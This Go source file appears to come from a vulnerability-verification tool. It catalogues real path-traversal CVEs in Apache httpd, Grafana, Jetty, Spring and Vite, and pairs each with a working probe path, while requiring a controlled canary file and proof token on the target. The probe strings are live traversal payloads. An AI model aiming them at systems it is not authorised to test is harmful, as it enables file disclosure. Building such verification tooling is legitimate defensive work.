package cvecheck

import (
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net/url"
	"regexp"
	"strings"
)

// The executable catalogue is operator-owned code, never a customer tool definition.
type Recipe struct {
	ID             string `json:"id"`
	Product        string `json:"product"`
	Preconditions  string `json:"preconditions"`
	Reference      string `json:"reference"`
	Version        string `json:"version"`
	Boundary       string `json:"boundary"`
	Probe          string `json:"probe"`
	Transform      string `json:"transform,omitempty"`
	LaboratoryOnly bool   `json:"laboratory_only"`
}

var catalogue = []Recipe{
	{ID: "CVE-2021-41773", Product: "Apache HTTP Server", Preconditions: "2.4.49; Alias directory readable, no CGI required", Reference: "https://httpd.apache.org/security/vulnerabilities_24.html#CVE-2021-41773", Boundary: "/{file}", Probe: "/cgi-bin/.%2e/.%2e/.%2e/.%2e/{file}"},
	{ID: "CVE-2021-42013", Product: "Apache HTTP Server", Preconditions: "2.4.49 or 2.4.50; Alias directory readable, no CGI required", Reference: "https://httpd.apache.org/security/vulnerabilities_24.html#CVE-2021-42013", Boundary: "/{file}", Probe: "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/{file}"},
	{ID: "CVE-2021-43798", Product: "Grafana", Preconditions: "8.0.0-beta1 through 8.3.0; public plugin assets endpoint", Reference: "https://grafana.com/security/security-advisories/cve-2021-43798/", Boundary: "/{file}", Probe: "/public/plugins/alertlist/../../../../../../../../{file}"},
	{ID: "CVE-2021-28164", Product: "Eclipse Jetty", Preconditions: "9.4.37 or 9.4.38; default servlet, controlled file inside WEB-INF", Reference: "https://github.com/jetty/jetty.project/security/advisories/GHSA-v7ff-8wcx-gmc5", Boundary: "/WEB-INF/{name}", Probe: "/%2e/WEB-INF/{name}"},
	{ID: "CVE-2021-28169", Product: "Eclipse Jetty", Preconditions: "ConcatServlet mapped to /static; vulnerable release before 9.4.41", Reference: "https://github.com/jetty/jetty.project/security/advisories/GHSA-gwcr-j4wh-j3cq", Boundary: "/static?/WEB-INF/{name}", Probe: "/static?/%2557EB-INF/{name}"},
	{ID: "CVE-2021-34429", Product: "Eclipse Jetty", Preconditions: "9.4.37 through 9.4.42; protected WEB-INF file", Reference: "https://github.com/jetty/jetty.project/security/advisories/GHSA-vjv5-gp2w-65vm", Boundary: "/WEB-INF/{name}", Probe: "/.%00/WEB-INF/{name}"},
	{ID: "CVE-2024-38816", Product: "Spring Framework", Preconditions: "WebFlux.fn RouterFunctions, FileSystemResource; before 6.1.13; no Spring Security firewall", Reference: "https://spring.io/security/cve-2024-38816/", Boundary: "/{file}", Probe: "/static/../../{file}"},
	{ID: "CVE-2024-38819", Product: "Spring Framework", Preconditions: "RouterFunctions with FileSystemResource; before 6.1.14; no Spring Security firewall", Reference: "https://spring.io/security/cve-2024-38819/", Boundary: "/{file}", Probe: "/static/%2e%2e/%2e%2e/{file}"},
	{ID: "CVE-2025-30208", Product: "Vite", Preconditions: "Network-exposed dev server; fs.deny protects controlled canary", Reference: "https://github.com/vitejs/vite/security/advisories/GHSA-x574-m823-4x7w", Boundary: "/@fs/{file}?raw", Probe: "/@fs/{file}?raw??"},
	{ID: "CVE-2025-31125", Product: "Vite", Preconditions: "Network-exposed dev server; fs.deny protects controlled canary; before 6.2.4", Reference: "https://github.com/vitejs/vite/security/advisories/GHSA-4r4m-qw57-chr8", Boundary: "/@fs/{file}?raw", Probe: "/@fs/{file}?inline&import", Transform: "base64"},
}

func Catalogue() []Recipe {
	out := append([]Recipe(nil), catalogue...)
	for i := range out {
		out[i].Version = "1"
		out[i].LaboratoryOnly = true
		if certified(out[i]) {
			out[i].LaboratoryOnly = false
		}
	}
	return out
}
func Lookup(id string) (Recipe, error) {
	for _, r := range Catalogue() {
		if r.ID == strings.ToUpper(id) {
			return r, nil
		}
	}
	return Recipe{}, fmt.Errorf("verifier is not supported")
}
func (r Recipe) Digest() string {
	b, _ := json.Marshal(r)
	h := sha256.Sum256(b)
	return hex.EncodeToString(h[:])
}

var identifier = regexp.MustCompile(`^[a-f0-9]{32}$`)

// Content and file identity are independent so reflecting a URL cannot satisfy the proof.
type Target struct {
	URL         string            `json:"url"`
	CanaryID    string            `json:"canary_id"`
	Token       string            `json:"token"`
	ControlPath string            `json:"control_path"`
	Headers     map[string]string `json:"headers,omitempty"`
}

func (t Target) Validate() error {
	u, e := url.Parse(t.URL)
	if e != nil || u.Hostname() == "" || (u.Scheme != "http" && u.Scheme != "https") || u.User != nil || u.RawQuery != "" || u.Fragment != "" || u.Path != "" && u.Path != "/" {
		return fmt.Errorf("an exact HTTP origin without credentials, path or query is required")
	}
	if !identifier.MatchString(t.CanaryID) || !strings.HasPrefix(t.Token, "vulnetic-proof:") || !identifier.MatchString(strings.TrimPrefix(t.Token, "vulnetic-proof:")) || strings.Contains(t.Token, t.CanaryID) {
		return fmt.Errorf("independent controlled canary identity and token are required")
	}
	if t.ControlPath != "/vulnetic-control/"+t.CanaryID+".txt" {
		return fmt.Errorf("controlled availability path is required")
	}
	if len(t.Headers) > 8 {
		return fmt.Errorf("too many request headers")
	}
	for k, v := range t.Headers {
		if !strings.EqualFold(k, "Authorization") && !strings.EqualFold(k, "Cookie") {
			return fmt.Errorf("only authorization and cookie headers are accepted")
		}
		if len(v) > 8192 || strings.ContainsAny(v, "\r\n") {
			return fmt.Errorf("invalid authentication header")
		}
	}
	return nil
}
func (r Recipe) paths(id string) (boundary, probe string) {
	name := "vulnetic-" + id + ".txt"
	file := "vulnetic-proof/" + name
	render := func(s string) string {
		s = strings.ReplaceAll(s, "{file}", file)
		return strings.ReplaceAll(s, "{name}", name)
	}
	return render(r.Boundary), render(r.Probe)
}
